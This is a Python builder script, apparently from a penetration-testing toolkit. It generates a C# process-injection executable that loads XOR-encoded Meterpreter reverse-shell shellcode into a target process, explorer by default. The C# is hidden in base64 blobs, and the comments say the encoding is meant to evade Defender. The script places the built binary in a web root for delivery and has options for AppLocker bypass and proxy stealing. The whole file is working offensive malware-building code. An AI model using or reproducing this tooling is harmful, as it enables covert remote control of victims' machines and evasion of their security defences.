import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunner import runner,gen,powershell_b64encode,makeoneliner,cradleps1
from makedll import xor_buffer_csharp
from makerunspace import certutil_b64encode

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

obfuscate_bin = "1" #"0" #"1"

devhost = "192.168.135.7"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writeinject(bitness,lhost,lport,bypass,process):
    injectfilename = "Inject.cs"

    if bypass == "0":
        upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKCm5hbWVzcGFjZSBJbmplY3QKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEV4YWN0U3BlbGxpbmcgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2NFeE51bWEoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QsIFVJbnQzMiBubmRQcmVmZXJyZWQpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5Qcm9jZXNzKHVpbnQgcHJvY2Vzc0FjY2VzcywgYm9vbCBiSW5oZXJpdEhhbmRsZSwgaW50IHByb2Nlc3NJZCk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgYnl0ZVtdIGxwQnVmZmVyLCBJbnQzMiBuU2l6ZSwgb3V0IEludFB0ciBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVSZW1vdGVUaHJlYWQoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBUaHJlYWRBdHRyaWJ1dGVzLCB1aW50IGR3U3RhY2tTaXplLCBJbnRQdHIgbHBTdGFydEFkZHJlc3MsIEludFB0ciBscFBhcmFtZXRlciwgdWludCBkd0NyZWF0aW9uRmxhZ3MsIEludFB0ciBscFRocmVhZElkKTsKCiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgICAgSW50UHRyIG1lbSA9IFZpcnR1YWxBbGxvY0V4TnVtYShHZXRDdXJyZW50UHJvY2VzcygpLCBJbnRQdHIuWmVybywgMHgxMDAwLCAweDMwMDAsIDB4NCwgMCk7CiAgICAgICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9"
        mid = "ICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaW50IHNpemUgPSBidWYuTGVuZ3RoOw=="
        lower = "ICAgICAgICAgICAgaW50IHBpZCA9IGV4cFByb2NbMF0uSWQ7CgogICAgICAgICAgICBJbnRQdHIgaFByb2Nlc3MgPSBPcGVuUHJvY2VzcygweDAwMUYwRkZGLCBmYWxzZSwgcGlkKTsKCiAgICAgICAgICAgIEludFB0ciBhZGRyID0gVmlydHVhbEFsbG9jRXgoaFByb2Nlc3MsIEludFB0ci5aZXJvLCAweDEwMDAsIDB4MzAwMCwgMHg0MCk7CgogICAgICAgICAgICBJbnRQdHIgb3V0U2l6ZTsKICAgICAgICAgICAgV3JpdGVQcm9jZXNzTWVtb3J5KGhQcm9jZXNzLCBhZGRyLCBidWYsIGJ1Zi5MZW5ndGgsIG91dCBvdXRTaXplKTsKCiAgICAgICAgICAgIEludFB0ciBoVGhyZWFkID0gQ3JlYXRlUmVtb3RlVGhyZWFkKGhQcm9jZXNzLCBJbnRQdHIuWmVybywgMCwgYWRkciwgSW50UHRyLlplcm8sIDAsIEludFB0ci5aZXJvKTsKCiAgICAgICAgfQogICAgfQp9"
    if bypass != "0":
        if bypass == "run":
            #makerunspace bypass of inject
            pass
        if bypass == "com":
            #makecompile bypass of inject
            pass

    pdata = "Process[] expProc = Process.GetProcessesByName(\"%s\");" % process

    gen(lhost,lport,bitness,"csharp")
    msffilename = "met%s.csharp" % (bitness)
    m = open(msffilename,'r')
    msf = m.read()
    m.close()
    msf = xor_buffer_csharp(msf) # 5/26 -defender

    with open(injectfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        mid = base64.b64decode(mid).decode()        
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            " + msf + "\n")
        f.write(mid + "\n")
        f.write("            " + pdata + "\n")
        f.write(lower)
    f.close()

    print('[+] inject cs written: %s' % injectfilename)
    return injectfilename
    pass

def makecombo_inject(lhost,injectfilename):
    pass

def makeinject(bitness,lhost,lport,bypass,process):
    injectfilename = writeinject(bitness,lhost,lport,bypass,process)
    csfilepath = "/home/kali/data/Inject/Inject/"
    csfilename = "Program.cs"
    exewebroot = "/var/www/html/"
    exefilename = "Inject.exe"

    copy(injectfilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)

    makecombo_inject(lhost,injectfilename)
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--bypass','-k',required=False,dest='bypass',help='run or com, applocker bypass techniques')
    parser.add_argument('--process','-s',required=False,dest='process',help='target process, e.g. spoolsv, explorer') # default: [TARGETHOST]    
    args = parser.parse_args()

    bitness = args.arch
    lhost = args.host
    lport = args.port
    bypass = args.bypass
    process = args.process

    if bypass == None: bypass = "0"
    if process == None: process = "0"

    if process == "0":
        process = "explorer"
        print('[!] default process used: %s' % process)

    if bypass == "0":
        print('[!] warning! no applocker bypass techniques chosen!')

    makeinject(bitness,lhost,lport,bypass,process)